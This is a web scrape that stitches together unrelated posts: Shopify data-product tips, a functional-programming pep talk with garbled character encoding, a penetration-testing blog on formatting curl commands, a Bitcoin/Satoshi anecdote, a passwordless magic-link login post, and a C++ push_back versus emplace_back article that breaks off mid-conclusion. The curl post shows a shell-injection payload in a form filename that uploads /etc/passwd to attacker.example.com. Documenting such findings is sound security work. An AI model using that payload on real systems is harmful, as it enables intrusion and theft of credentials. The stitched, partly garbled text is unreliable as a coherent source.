<p>At Shopify, following these tips has provided the team with a clearer path for launching brand new data products under tight time constraints. More importantly, it helped us avoid common pitfalls like getting stuck during neverending design phases, overengineering complex machine learning systems, or building data products that users don’t use.&nbsp;</p>
<p>Next time you’re under a tight timeline to ship a new data product, remember to:</p>
<ol>
<li>
<strong><em>Utilize design sprints</em></strong> to help focus your team’s efforts and remove the stress of the ticking clock</li>
<li>
<strong><em>Don’t skip on prototyping,</em></strong> it’s a great way to fail early</li>
<li>
<strong><em>Avoid machine learning</em></strong> (for first iterations) to avoid being slowed down by unnecessary complexity</li>
<li>
<strong><em>Talk to your users</em></strong> so you can get a better sense of what problem they’re facing and what they need in a product</li>
</ol>

<p>
  This article has been re-written, most of the original content has been moved to the next article.
</p>

<p>Wandering developer, your next adventure awaits, and I know youâ€™re ready because youâ€™ve been ready since you wrote your first line of code.</p>

<p>This journey will bring you fame of course, and glory, sooo much glory. But above all else, this journey will take you to that lost magical place where the code you write somehow speaks to you like a great melody sounds familiar even as you listen to it for the first time.</p>

<p>Itâ€™s ok for you to be <strong>skeptical</strong>, maybe all you care about is creating <strong>code that works</strong>, but this seemingly academic topic is a shortcut towards that, not a distraction, as it will dramatically reduce the times you create code that doesnâ€™t.</p>

<h2 id="do-not-postpone-this-journey">Do not postpone this journey</h2>

<p>Many have put it off in a futile attempt to master their craft first. Do not make this mistake, this journey requires no credentials or academic recognition of your readiness.</p>

<p>Do not ask for permission.</p>

<p>All you need is the <strong>love of your craft</strong> that took you here, and the inquisitive <strong>open mind</strong> of someone for whom no leap is too far to reach truer grounds.</p>

<h2 id="do-not-mistake-this-journey-for-what-its-not">Do not mistake this journey for what itâ€™s not</h2>

<p>The path ahead is not about learning an alternative way of doing the same thing, this would not be a good use of your time. Rather, this journey is about recognizing how misguided some of the concepts weâ€™ve held true have always been.</p>

<p>Going from the comfort of what you already know to the discomfort of what you donâ€™t even realize you donâ€™t know requires curiosity, but it also requires courage.</p>

<h2 id="there-is-no-courage-without-fear">There is no courage without fear</h2>

<p>The fear of investing oneâ€™s precious time learning something before even being capable of understanding its purpose is justified.</p>

<p>Your time, and even more so your mental energy is very precious. If you feel fear, accept it, embrace it even, for <strong><em>it</em></strong> is the proof that it was courage, not chance, that set you off on this journey.</p>

<h2 id="the-first-step-is-the-hardest">The first step is the hardest</h2>

<p>Even if it seems like dark magic, youâ€™ll very soon learn the basic spells, and by then you will already be a much better wizard.</p>

<p>Itâ€™s true that Functional Wonderland is vast and full of mysteries, but you donâ€™t have to venture deep to reap the rewards, in fact youâ€™ll get most of the value just from skirting its shores, and will not be doing it alone.</p>

<p>Indeed, you will not be the first <strong>object oriented programmer</strong> to set sail, neither will you be the last, but for all that attempted this perilous but infinitely rewarding journey it always started in the same <a href="https://impure.fun/fun/2021/03/04/the-objects-you-know-and-love-copy/">familiar place</a>.</p>

  <div>
    <h4>4 March 2021</h4>
    
    



    <p>An important part of each penetration test is the documentation of all discovered vulnerabilities.
The documentation often includes program calls to further demonstrate how a vulnerability was found, tested or exploited. To better visualise these steps in the context of web applications, we often include invocations of the command-line HTTP client <a href="https://curl.se/">curl</a>. In the following, we discuss how program calls can be styled for documentation to appeal to all audiences.</p>
<div>
        <p><img src="https://blog.redteam-pentesting.de/2021/wholesome-curl-calls/curl-help_hu01b7b4bf6fb2e671d3b4cc1141a5d2a3_15721_640x0_resize_box_2.png" alt="curl program call for help">
        </p>
    </div>



<p>You have probably seen some more or less cryptic curl program calls, included for example in blog posts, scripts, Dockerfiles or configuration files. The program calls often are formatted as one-liners that result in very long horizontal scroll bars. Sometimes the authors use abbreviated parameter names, making it hard to understand the meaning of arguments or options.</p>
<p>Truth be told: horizontal scrolling on a mobile device is not enjoyable. Neither is a lookup into the man page to check for the abbreviated parameter’s meanings. Therefore, one should strive to write program calls that are as self-explanatory and easy readable.</p>
<p>
    In the following, we use the public instance of the <a href="https://github.com/postmanlabs/httpbin"><code>httpbin</code></a> project to demonstrate some of the curl program calls.
</p>

<!-- raw HTML omitted -->
<h3 id="consider-using-self-explanatory-parameter-options">Consider Using Self-Explanatory Parameter Options</h3>
<p>Quite often curl program calls contain abbreviated parameters like the following to not verify the TLS certificate of the remote host:</p>
<pre><code>$ curl -k https://httpbin.org/status/301
</code></pre><p>To help your readers that might not be familiar with curl or the abbreviated program parameters just use the longer versions as these are in most cases self-explanatory:</p>
<pre><code>$ curl --insecure https://httpbin.org/status/301
</code></pre><h3 id="minimise-horizontal-scrolling">Minimise Horizontal Scrolling</h3>
<p>Consider you craft a complex curl command that has the necessity to connect insecurely, suppresses its output except for response data, makes use of cookies and also includes URL parameters:</p>
<!-- raw HTML omitted -->
<pre><code>$ curl -k -s -H 'Cookie: auth=eyJpZCI6IjAiLCJuYW1lIjoiUmVkVGVhbSBQZW50ZXN0aW5nIn0;' 'https://httpbin.org/get?foo=1&amp;bar=2' | jq .args
</code></pre><p>As you see, such a program call could become very long. Instead of putting everything in one line, try to separate arguments in different lines. This makes the usage of self-explanatory parameters even more valuable:</p>
<pre><code>$ curl --insecure --silent \
--cookie 'auth=eyJpZCI6IjAiLCJuYW1lIjoiUmVkVGVhbSBQZW50ZXN0aW5nIn0' \
'https://httpbin.org/get?foo=1&amp;bar=2' | jq .args
</code></pre><p>But what to do if your URL contains many parameters? One solution is to split the URL from the parameters like the following:</p>
<pre><code>$ curl --insecure --silent \
--cookie 'auth=eyJpZCI6IjAiLCJuYW1lIjoiUmVkVGVhbSBQZW50ZXN0aW5nIn0' \
'https://httpbin.org/get'\
'?foo=1&amp;bar=2' | jq .args
</code></pre><p>Another approach that curl supports is to define URL parameters as separate arguments. Note that for this to work, the option <code>--get</code> can be used. This declares that all data parameters curl uses per default for HTTP POST requests are now used as URL parameters for the specified request method:</p>
<pre><code>$ curl --get \
--insecure --silent \
--cookie 'auth=eyJpZCI6IjAiLCJuYW1lIjoiUmVkVGVhbSBQZW50ZXN0aW5nIn0' \
--data 'foo=1' --data 'bar=2' \
'https://httpbin.org/get' | jq .args
</code></pre><h3 id="pretty-formatting-for-cookies----and-other-surprises-along-the-way">Pretty Formatting for Cookies – And Other Surprises Along The Way</h3>
<p>Depending on your audience, you want to write program calls that are more or less verbose. Sometimes, you also may not be aware of a better variant and stick to the parameters you are used to. The following example is seen quite often:</p>
<pre><code>$ curl -H 'Cookie: example=AABBCC; auth=eyJpZCI6IjAiLCJuYW1lIjoiUmVkVGVhbSBQZW50ZXN0aW5nIn0;' https://httpbin.org/cookies
</code></pre><p>The usage of the <code>-H</code> parameter is not the only possible solution here as there is also a parameter for cookies. For readability reasons, multiple usage of the <code>--cookie</code> parameter is desired. However, at the time of writing this blog post it was not possible as per documentation multiple usages will overwrite the last one. We <a href="https://twitter.com/RedTeamPT/status/1364130000669208578">asked</a> Daniel Stenberg (<a href="https://twitter.com/bagder">@bagder</a>), the creator of curl, why this behaviour distinguishes from other parameters like the <code>--data</code> variants. He responded with the following:</p>
<blockquote>
<p>It has worked like that since October 1998 when we originally created the option. Because nobody thought of making it different then or worked on changing it since.</p>
</blockquote>
<p>To our great delight, Daniel Gustafsson (<a href="https://twitter.com/d_gustafsson">@d_gustafsson</a>) which is also one of the curl authors, decided to create a <a href="https://github.com/curl/curl/pull/6649">pull request</a> to change this behaviour! Thanks to him, in future versions of curl it will be possible to use multiple <code>--cookie</code> parameters as a more elegant solution:</p>
<pre><code>$ curl --cookie 'example=AABBCC' \
--cookie 'auth=eyJpZCI6IjAiLCJuYW1lIjoiUmVkVGVhbSBQZW50ZXN0aW5nIn0' \
https://httpbin.org/cookies
</code></pre><p>As this happened quite recently, the release is not available yet or maybe not shipped in popular Linux distributions for now. Alternatively, string concatenation per shell can be used to separate cookies in multiple lines:</p>
<pre><code>$ curl --cookie 'example=AABBCC;'\
'auth=eyJpZCI6IjAiLCJuYW1lIjoiUmVkVGVhbSBQZW50ZXN0aW5nIn0;' \
https://httpbin.org/cookies
</code></pre><p>Nevertheless, keep an eye out for new curl releases. 😉</p>
<p>Another option might be to first display a file containing a set of cookies, for example <code>cookies.txt</code>, which has a specific format according to the <a href="https://curl.se/docs/http-cookies.html">documentation</a>:</p>
<pre><code>$ cat cookies.txt
httpbin.org	FALSE	/	TRUE	0	example	AABBCC
httpbin.org	FALSE	/	TRUE	0	auth	eyJpZCI6IjAiLCJuYW1lIjoiUmVkVGVhbSBQZW50ZXN0aW5nIn0
</code></pre><p>Afterwards, you can use that file as an input for the cookie parameter:</p>
<pre><code>$ curl --cookie cookies.txt https://httpbin.org/cookies
</code></pre><h3 id="enjoyable-post-requests">Enjoyable POST Requests</h3>
<p>Next, we’ll have a closer look at HTTP POST requests. Let’s take the following example:</p>
<pre><code>$ curl -X POST -H 'Content-Type: application/x-www-form-urlencoded' -d 'example=1&amp;input=2&amp;path=%2Fetc%2Fpasswd' https://httpbin.org/post
</code></pre><p>Here, most of the parameters can be omitted as curl automatically assumes an HTTP POST request with the respective <code>Content-Type</code> for it. Furthermore, it is not necessary to define the parameter values URL-encoded, as curl offers a neat functionality for it. As a benefit the arguments are easier to read:</p>
<pre><code>$ curl --data 'example=1' \
--data 'input=2' \
--data-urlencode 'path=/etc/passwd' \
https://httpbin.org/post
</code></pre><p>However, you still need to manually apply URL encoding for the name of a HTTP POST parameter if necessary. We opened a discussion thread for possible solutions at the <a href="https://github.com/curl/curl/discussions/6667">curl GitHub page</a>.</p>

<p>Depending on how familiar your readers are with curl, it might be of additional value to add the HTTP method used while not technically necessary:</p>
<pre><code>$ curl --method POST \
--data 'example=1' \
--data 'input=2' \
--data-urlencode 'path=/etc/passwd' \
https://httpbin.org/post
</code></pre><p>This should be considered for every option that might give readers a benefit in understanding what the program call is all about.</p>
<h3 id="about-forms">About Forms</h3>
<p>Finally, documenting file uploads or HTTP POST requests with the content type <code>multipart/form-data</code> is often very painful if directly copied from an attack proxy or somehow manually crafted for curl. For a more convenient usage the <code>--form</code> parameter is offered. An example request looks like the following:</p>
<pre><code>$ curl --cookie 'auth=eyJpZCI6IjAiLCJuYW1lIjoiUmVkVGVhbSBQZW50ZXN0aW5nIn0' \
--form 'profile=@red.png;type=something/different;filename=testimage.png' \
--form 'example=1' \
--form 'auth=AABBCC' \
--form 'remark=&lt;longtext.txt' \
 https://httpbin.org/post
</code></pre><p>As you see in the request, the characters <code>@</code> and <code>&lt;</code> have special meanings. The first one signals that a file should be treated as a file upload, the second one reads a file and pastes the contents into the respective form field. During penetration tests, especially the value of a filename parameter could be interesting to test for shell injection vulnerabilities. Therefore, such a vulnerability could be easily demonstrated with curl using the <code>--form</code> parameter without the need to build the whole <code>multipart/form-data</code> request manually:</p>
<pre><code>$ curl --cookie 'auth=eyJpZCI6IjAiLCJuYW1lIjoiUmVkVGVhbSBQZW50ZXN0aW5nIn0' \
--form 'profile=@red.png;filename='\
'"test.png; curl --upload-file /etc/passwd https://attacker.example.com;"' \
 https://httpbin.org/post
</code></pre><p>As the attentive reader may have noticed, the <code>&lt;</code> directive is not used for the example payload to exploit the shell injection to be read from a file because these two operators cannot be combined in one <code>--form</code> parameter value yet. Therefore, the injection is quoted and later concatenated in the shell.
We also created a discussion for this at the <a href="https://github.com/curl/curl/discussions/6669">curl GitHub page</a>. Feel free to contribute to the discussion!</p>

<h3 id="final-thoughts">Final thoughts</h3>
<p>This is just a rough outline of what is possible with curl program calls. Generally speaking, it should be the number one goal for you to write program calls that are easily readable and quickly understandable. The approach is not only useful for documentation during penetration tests or blog posts. If program calls are used in scripts or code, the usage of comprehensive calls might also help you in the long run.</p>

<p><span><em><strong>TL;DR</strong> A news article I wrote for IDG in 2010 was the first mainstream media discussion of Bitcoin. As a direct result, the individual believed to have created Bitcoin—Satoshi Nakamoto—said “the swarm is headed towards us”. He disappeared after posting that to a forum, and hasn’t been heard from since. </em></span></p>
<p><span><em>Let’s make this clear from start: I didn’t force anybody into hiding, or know Satoshi Nakamoto. But if what I wrote was indeed a contributing factor, I am not proud of this. The thought I affected anybody’s life in a negative way hugely upsets me. But now that Bitcoin is insanely popular, the incident has become infamous. It’s time to tell my story.<strong> /TL;DR<span>&nbsp;</span></strong></em></span></p>
<figure id="attachment_106" aria-describedby="caption-attachment-106"><img loading="lazy" src="https://www.keirthomas.com/wp-content/uploads/2021/02/Screenshot-2021-02-24-at-7.35.25-am-300x255.png" alt="Bizfeed logo" width="300" height="255"><figcaption id="caption-attachment-106">Bizfeed logo</figcaption></figure><p>Back in 2010 I was a freelance journalist. I took work where I could find it. One of my jobs was to write news stories for PC World’s Bizfeed and Newsdesk blogs.</p>
<p>(Note for UK readers: PC World is one of the biggest US computing magazines/websites, and not a crappy tech retailer, like here in the UK!)</p>
<p>The goal with the blogging was simple and primitive: Break news stories before anybody else.</p>
<p>Doing so meant Google News would put our articles at the top of the list if that topic began to trend, because we got there first.<span>&nbsp;</span></p>
<p>That meant clicks. Clicks meant ad conversions.</p>
<p>It was necessary for me to hammer these articles out, usually writing the required two per day by lunchtime. Because I was in the UK, this meant they were ready for the site’s US editor when she arrived at work, 9am EST.</p>
<p>It always made me smile when I approached a source for an interview and they said something like, “Sure, I can speak to you Thursday next week”. By that time my article would not only be published but literally old news.</p>

<p>It’s the toughest writing job I’ve ever had. Some of the articles I wrote did amazingly well, like when I&nbsp;<a href="https://www.pcworld.com/article/226128/Sony_Makes_it_Official_PlayStation_Network_Hacked.html">covered the Sony PlayStation hacks</a>&nbsp;and managed to reveal key developments before anybody else.</p>
<p>I got paid a fraction of a cent per click, and a single popular article would pay my living expenses for a week, or even longer.</p>
<figure id="attachment_107" aria-describedby="caption-attachment-107"><img loading="lazy" src="https://www.keirthomas.com/wp-content/uploads/2021/02/Screenshot-2021-02-24-at-7.37.59-am-300x211.png" alt="Wikileaks blog screenshot" width="300" height="211"><figcaption id="caption-attachment-107">Wikileaks blog screenshot</figcaption></figure><p>Most articles I wrote sunk to the deeps of the ocean, leaving only a trail of bubbles behind. One of these was about how <a href="https://www.pcworld.com/article/213230/could_wikileaks_scandal_lead_to_new_virtual_currency.html">Wikileaks was asking for donations in something called Bitcoin</a>.<span>&nbsp;</span></p>
<p>Nobody back then knew what Bitcoin was. But I’d been following it as part of my general interest in open source technology.</p>
<p>So, I wrote the article. Remember: I had little time to do involved research. To write about something I already understood was a gift.</p>
<p>I wrote about how there was a mysterious guy behind it all: Satoshi Nakamoto. I can’t recall how I knew this. I think I just checked the official Bitcoin website.</p>
<p>Once the article was done, I immediately moved onto the next one, like I always did.&nbsp;</p>
<p>A few days later I got a few emails from people angry about the piece. I was accused of “lazy journalism”. They accused me of claiming Bitcoin was created by Wikileaks.</p>
<p>Reading the article now, I continue to believe these accusations are untrue. Offensive, even. Like any good journalist, I checked facts against canonical sources before submitting work to the editor.</p>
<p>The editor wouldn’t publish if I made stuff up.&nbsp;That isn’t how it works.&nbsp;</p>
<p>I promptly forgot all about the article, as I forgot about all the others.</p>

<p>Now working as a content writer at a software company, with the hack work of news blogging long behind me, I received a LinkedIn message from a journalist. He told me he was writing a book about Bitcoin.<span>&nbsp;</span></p>
<p>Would I be interested in being interviewed?<span>&nbsp;</span></p>
<p>What?! Why would he ask that?</p>
<p>By this point, Bitcoin was heading towards the moon. In that article back in 2010, I’d written that one Bitcoin was worth 20 cents. A coffee shop somewhere had begun accepting several in return for a steaming brew.</p>
<p>But now just one Bitcoin was worth over $9,000! I think I’m justified in using an emoji here:</p>

<p>It was making headlines in newspapers, with Nakamoto’s disappearance being a nut everybody wanted to crack. Where was he? Did he even exist?</p>
<p>“Your article made a huge impact,” wrote the journalist in his message to me.<span>&nbsp;</span></p>
<p>I had to google my article to even remember what I’d written.</p>
<p>The journalist continued (and I paraphrase here because I haven’t sought permission to quote him):<span>&nbsp;</span></p>
<blockquote>
<p>“In the history of Bitcoin, your article made Satoshi Nakamoto panic. Pretty soon he dropped all responsibility for Bitcoin. He handed over the project to Gavin Andresen and then largely disappeared.”</p>
</blockquote>
<p>Have you ever been told something that makes your stomach feel like it’s exited your body? That Charlie Brown feeling?</p>
<figure id="attachment_91" aria-describedby="caption-attachment-91"><img loading="lazy" src="https://www.keirthomas.com/wp-content/uploads/2021/02/sick-charlie-brown.jpg" alt="Charlie Brown feeling sick" width="300" height="185"><figcaption id="caption-attachment-91">Charlie Brown feeling sick</figcaption></figure><p>That’s how I felt.<span>&nbsp;But it was also tinged with excitement. As a journalist, knowing something I’ve written had gone on to create such an impact was incredible. That’s why writers do what we do!&nbsp;</span></p>
<p>I told my wife. Her jaw dropped to the floor. We discussed what must’ve been going through Nakamoto’s head. Couldn’t I just drop him a line and say sorry, she asked? Um. Sadly not.</p>
<p>I told colleagues. One of them used a website that tracks backlinks to find the original forum post where, in 2010, Nakamoto had written about my article – literally his final message to the world before disappearing:</p>

<blockquote>
<p>“It would have been nice to get this attention in any other context. WikiLeaks has kicked the hornet’s nest, and the swarm is headed towards us.” <a href="https://bitcointalk.org/index.php?topic=2216.0">https://bitcointalk.org/index.php?topic=2216.0</a></p>
</blockquote>
<p>I had never seen this forum post before.</p>
<p>Using the backlinking tool, I discovered that forum post and my article had entered Bitcoin folklore across the decade since. Countless people had discussed its significance.&nbsp;</p>
<p>I had absolutely no idea.</p>
<figure id="attachment_110" aria-describedby="caption-attachment-110"><img loading="lazy" src="https://www.keirthomas.com/wp-content/uploads/2021/02/Screenshot-2021-02-24-at-7.54.06-am-1024x200.png" alt="Satoshi Nakamoto's final post before disappearing" width="840" height="164"><figcaption id="caption-attachment-110">Satoshi Nakamoto’s final post before disappearing. Note his annoyance at Wikileaks, rather than at the article</figcaption></figure>
<p>And, really, this is the end of the story for me.</p>
<p>I didn’t get interviewed because I had nothing to tell. I never knew anybody involved with Bitcoin. I never knew Nakamoto. I have no inside information.<span>&nbsp;</span></p>
<p>Yet here I am, an actual footnote in one of the most fantastic stories in computing and perhaps even world finance.<span>&nbsp;</span></p>
<p>How do I feel?</p>
<p>Well.</p>

I’m pretty sure that isn’t Nakamoto!</figcaption></figure><p>I’ve been absolutely wrong two times about nascent technologies.<span>&nbsp;</span></p>
<p>The first was YouTube. I was convinced it would never be more than people posting clips stolen from TV shows. I never believed there would be something called a professional YouTuber (although I’m so glad there are – I spend a lot of time at that website today!).</p>
<p>The second was Bitcoin. I installed the Bitcoin-generating software back in 2010, ran it for a day or two, and then uninstalled it.</p>
<p>A virtual currency?! What a crazy idea!</p>
<p>While writing this today, I setup my second Bitcoin wallet after that first attempt in 2010. Yes, really. I’ve watched from afar. I’ve laughed with friends about how if I’d just left that app running back in 2010 I’d probably be writing this from a personal jet right now.&nbsp;</p>
<p>But I’ve never actually gone back and created a wallet – until now.&nbsp;</p>
<p>If you found my story interesting, why not drop a few cents in there. See below.&nbsp;</p>
<p>Oh, and if Mr Nakamoto is reading this then… Sorry. <a href="mailto:k@keirthomas.com">Drop me a line</a>. It’d be good to chat. I’d love to both know your story, and help share it with the world if you’d like that. Wouldn’t it be great to pick up the story at the point where it left off?</p>

                    <p>Passwords are dying. The cost of creating and maintaining passwords is becoming untenable. Which can be seen in the rise of users logging in with social products and developers outsourcing their pain to Auth0 and the likes. We decided to sidestep the password based authentication and went passwordless on our new product. Read on to see how you can go passwordless too.</p><p><strong>The cost of passwords</strong></p><p>Passwords create too much friction for users. It’s becoming difficult to come up with passwords that satisfy the ever growing password strength requirements - minimum 9 characters, 1 number, 1 upper case, 1 special character etc. And with the rise of data breaches where hackers steal and sell password data on the internet, passwords are only really effective when you don’t repeat them across different services. Which means you have to remember unique passwords or use a password manager.</p><p>Passwords are even more painful for developers to build and maintain. Imagine the work - 4 forms (signup, login, reset password, send forgot password link), storing passwords securely, managing email service providers for deliverability and spam scores. All this work just for the auth, which is not your core product and not what users come to you for. </p><p><strong>Magic links, the solution to the password problem</strong></p><p>An elegant solution to this mess is authenticating users using magic links sent on email. We all use email anyway as a core part of our online identity and authentication. So instead of logging in with email and password, you enter your email and get a login link sent to you. You might have seen Slack do this.</p><figure><img src="https://lh3.googleusercontent.com/2Yx1vwl0CygQi3k1aT9iKXiAETGQmsfaNuE2uA4-KsTWrGKN-WjwAGQv_XwPOpv3zainHdNZ29jbxiJYBIbVo-iKPAE9BMHIkVlKZQgVFzJK0dxaoaoJmQ6a-k5UuKDmNecYiqZY"><figcaption>Slack popularised magic links for logging in</figcaption></figure><p><strong>How we went passwordless with magic link</strong></p><p>When we were building our new product, we didn’t want to spend time building full blown password auth, so we decided on using magic links. And although the work involved building a magic link system is less than traditional auth, it is still valuable developer time spent on non-core plumbing. After some research, we found <a href="https://magic.link/">Magic</a> which provides magic links as a service. We loved the focus on security (the founders have built a security product in the past), the good design and the developer friendly docs. </p><p>The implementation involves a client SDK (for web and mobile) for showing the Magic overlay (screenshots below) and server code for managing sessions. We used the sample code provided to implement this. </p><p><strong>The user experience of magic links</strong></p><p>Login form</p><figure><img src="https://lh6.googleusercontent.com/87Sh7Be5B83QExzyE2bF12OGsrTom6Lpw-haLYteMvUUaoFyZbe9FLozGgE1bcMgB7x0NyTThb0fj-uqwanGADb3OpA9x5srYvNqVGlKSvPoy9XvYR4xjDwEcKNKInFDNC8JUAqD"><figcaption>Sign up and Log in form</figcaption></figure><p>Email</p><figure><img src="https://lh5.googleusercontent.com/EtAzDiIBqb7SpaSTW6W3qRB5J7E7uq-ThWLXWPczkdIKIXXbhRK74OlQkFMrcTIkWXI5YJC7blPMl5qblW4wF5mM_JpFOicTIXy_rr0R9Ijn0dsSJv4O-a0xfFBJRs38F0MYlxfk"><figcaption>Magic link email</figcaption></figure><p>You can <a href="https://incidents.sh/">try out the experience for yourself</a> on our new product. It’s a free timer for developers to keep track of major software incidents, built by the team who also built the simple <a href="https://spike.sh/">incident alerting</a> product for developers.</p><p><strong>Conclusion</strong></p><p>After using magic links as a developer and as a user, I loved the experience. There are still some hiccups as with any new technology, but overall this looks like the future. And I am quite excited to watch it unfold!</p>

March 4, 2021 | https://quuxplusone.github.io/blog/2021/03/03/push-back-emplace-back/ | <a href="https://web.archive.org/web/*/https://quuxplusone.github.io/blog/2021/03/03/push-back-emplace-back/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <p>In one of my recent training courses, a student informed me that both clang-tidy
and PVS-Studio were complaining about some code of the form</p>

<div><div><pre><code>std::vector&lt;Widget&gt; widgets;
~~~
widgets.push_back(Widget(foo, bar, baz));
</code></pre></div></div>

<p>Both tools flagged this line as “bad style.”
clang-tidy even offered a (SARCASM ALERT) helpful fixit:</p>

<div><div><pre><code>warning: use emplace_back instead of push_back [modernize-use-emplace]
    widgets.push_back(Widget(foo, bar, baz));
            ^~~~~~~~~~~~~~~~~             ~
            emplace_back(
</code></pre></div></div>

<p>The student dutifully changed the line, and both tools reported their
satisfaction with the replacement:</p>

<div><div><pre><code>widgets.emplace_back(Widget(foo, bar, baz));
</code></pre></div></div>

<p>The original line materializes a temporary <code>Widget</code> object on the stack;
takes an rvalue reference to it; and passes that reference to
<code>vector&lt;Widget&gt;::push_back(Widget&amp;&amp;)</code>, which move-constructs a <code>Widget</code>
into the vector. Then we destroy the temporary.</p>

<p>The student’s replacement materializes a temporary <code>Widget</code> object on the stack;
takes an rvalue reference to it; and passes that reference to
<code>vector&lt;Widget&gt;::emplace_back&lt;Widget&gt;(Widget&amp;&amp;)</code>, which move-constructs
a <code>Widget</code> into the vector. Then we destroy the temporary.</p>

<p><em>Absolutely no difference.</em></p>

<p>The change clang-tidy meant to suggest — and in fact <em>did</em> suggest,
if you pay very close attention to the underlining in the fixit — was actually this:</p>

<div><div><pre><code>widgets.emplace_back(foo, bar, baz);
</code></pre></div></div>

<p>This version does <em>not</em> materialize any <code>Widget</code> temporaries. It simply
passes <code>foo, bar, baz</code> to <code>vector&lt;Widget&gt;::emplace_back&lt;Foo&amp;, Bar&amp;, Baz&amp;&gt;(Foo&amp;, Bar&amp;, Baz&amp;)</code>,
which constructs a <code>Widget</code> into the vector using whatever
constructor of <code>Widget</code> best matches that bunch of arguments.</p>

<h2 id="emplace_back-is-not-magic-c11-pixie-dust"><code>emplace_back</code> is not magic C++11 pixie dust</h2>

<p>Even a decade after C++11 was released, I still sometimes see programmers assume
that <code>emplace_back</code> is somehow related to move semantics. (In the same way that
some programmers assume lambdas are somehow the same thing as <code>std::function</code>,
you know?) For example, they’ll rightly observe that this code makes an
unnecessary copy:</p>

<div><div><pre><code>void example() {
    auto w = Widget(1,2,3);
    widgets.push_back(w);  // Copy-constructor alert!
}
</code></pre></div></div>

<p>So they’ll change it to this:</p>

<div><div><pre><code>void example() {
    auto w = Widget(1,2,3);
    widgets.emplace_back(w);  // Fixed? Nope!
}
</code></pre></div></div>

<p>The original line constructs a <code>Widget</code> object into <code>w</code>, then
passes <code>w</code> by reference to <code>vector&lt;Widget&gt;::push_back(const Widget&amp;)</code>,
which copy-constructs a <code>Widget</code> into the vector.</p>

<p>The replacement constructs a <code>Widget</code> object into <code>w</code>, then
passes <code>w</code> by reference to <code>vector&lt;Widget&gt;::emplace_back&lt;Widget&amp;&gt;(Widget&amp;)</code>,
which copy-constructs a <code>Widget</code> into the vector.</p>

<p><em>Absolutely no difference.</em></p>

<p>What the student should have done is ask the compiler to make an
<em>rvalue</em> reference to <code>w</code>, by saying either</p>

<div><div><pre><code>widgets.push_back(std::move(w));
</code></pre></div></div>

<p>or</p>

<div><div><pre><code>widgets.emplace_back(std::move(w));
</code></pre></div></div>

<p>It doesn’t matter which verb you use; what matters is the value category of
<code>w</code>. You must explicitly mention <code>std::move</code>, so that the language (and the
human reader) understand that you’re done using <code>w</code> and it’s okay for
<code>widgets</code> to pilfer its guts.</p>

<p><code>emplace_back</code> was added to the language at the same time as <code>std::move</code> — just
like lambdas were added at the same time as <code>std::function</code> — but that doesn’t
make them the same thing. <code>emplace_back</code> may “look more C++11-ish,” but it’s
not magic move-enabling pixie dust and it will never insert a move in a place
you don’t explicitly request one.</p>

<h2 id="when-all-else-is-equal-prefer-push_back-to-emplace_back">When all else is equal, prefer <code>push_back</code> to <code>emplace_back</code></h2>

<p>So, given that these two lines do the same thing and are equally efficient
at runtime, which should I prefer, stylistically?</p>

<div><div><pre><code>widgets.push_back(std::move(w));
widgets.emplace_back(std::move(w));
</code></pre></div></div>

<p>I recommend sticking with <code>push_back</code> for day-to-day use. You should definitely
use <code>emplace_back</code> when you need its particular set of skills — for example, <code>emplace_back</code>
is your only option when dealing with a <code>deque&lt;mutex&gt;</code> or other non-movable type —
but <code>push_back</code> is the appropriate default.</p>

<p>One reason is that <code>emplace_back</code> is more work for the compiler.
<code>push_back</code> is an overload set of two non-template member functions.
<code>emplace_back</code> is a single variadic template.</p>

<div><div><pre><code>void push_back(const Widget&amp;);
void push_back(Widget&amp;&amp;);

template&lt;class... Ts&gt;
reference emplace_back(Ts&amp;&amp;...);
</code></pre></div></div>

<p>When you call <code>push_back</code>, the compiler must do overload resolution, but that’s all.
When you call <code>emplace_back</code>, the compiler must do template type deduction, followed
by (easy-peasy) overload resolution, followed by function template instantiation and
code generation. That’s a much larger amount of work for the compiler.</p>

<h2 id="the-benchmark-program">The benchmark program</h2>

<p>I wrote a simple test program to demonstrate the difference in compiler workload.
Of course <a href="https://en.wikipedia.org/wiki/Amdahl%27s_law">Amdahl’s Law</a> applies:
my benchmark displays a massive difference because it’s doing <em>nothing but</em>
instantiating <code>emplace_back</code>, whereas any production codebase will be doing vastly
more other stuff relative to the number of times it instantiates <code>emplace_back</code>.
Still, I hope this benchmark gives you a sense of why I recommend “<code>push_back</code> over
<code>emplace_back</code>” and not vice versa.</p>

<p>This Python 3 script generates the benchmark:</p>

<div><div><pre><code>import sys
print('#include &lt;vector&gt;')
print('#include &lt;string&gt;')
print('extern std::vector&lt;std::string&gt; v;')
for i in range(1000):
    print('void test%d() {' % i)
    print('    v.%s_back("%s");' % (sys.argv[1], 'A' * i))
    print('}')
</code></pre></div></div>

<p>Generate like this:</p>

<div><div><pre><code>python generate.py push &gt;push.cpp
python generate.py emplace &gt;emplace.cpp
time g++ -c push.cpp
time g++ -c emplace.cpp
</code></pre></div></div>

<p>With Clang trunk on my laptop, I get consistently about 1.0s for the <code>push</code> version,
and 4.2s for the <code>emplace</code> version. This big difference is due to the fact that the
<code>push</code> version is merely code-generating a thousand <code>test</code> functions, whereas
the <code>emplace</code> version is code-generating that same thousand <code>test</code> functions <em>and</em>
another thousand template instantiations of <code>emplace_back</code> with different parameter
types:</p>

<div><div><pre><code>vector&lt;string&gt;::emplace_back&lt;const char(&amp;)[1]&gt;(const char (&amp;)[1])
vector&lt;string&gt;::emplace_back&lt;const char(&amp;)[2]&gt;(const char (&amp;)[2])
vector&lt;string&gt;::emplace_back&lt;const char(&amp;)[3]&gt;(const char (&amp;)[3])
vector&lt;string&gt;::emplace_back&lt;const char(&amp;)[4]&gt;(const char (&amp;)[4])
~~~
</code></pre></div></div>

<p>See, <code>push_back</code> knows that it expects a <code>string&amp;&amp;</code>, and so it knows to call the
non-explicit constructor <code>string(const char *)</code> on the caller’s side. The same
constructor is called in each case, and the temporary <code>string</code> is passed to
the same overload of <code>push_back</code> in each case. <code>emplace_back</code>, on the other hand,
is a dumb perfect-forwarding template: it doesn’t know that the relevant constructor
overload will end up being <code>string(const char *)</code> in each case. So it takes
an lvalue reference to the specific <em>array type</em> being passed by the caller.
Perfect-forwarding has no special cases for <code>const char *</code>!</p>

<p>If we change <code>vector&lt;string&gt;</code> to <code>vector&lt;const char *&gt;</code>, the compile-time-performance
gap widens: now it’s 0.7s for <code>push</code>, 3.8s for <code>emplace</code>. This is because we’ve cut
out some of the work that was common to both versions (constructing <code>std::string</code> objects)
without affecting the source of the gap (that one version instantiates a
thousand copies of <code>emplace_back</code> and the other doesn’t). Amdahl’s Law in action!</p>

<p>My conclusions:</p>

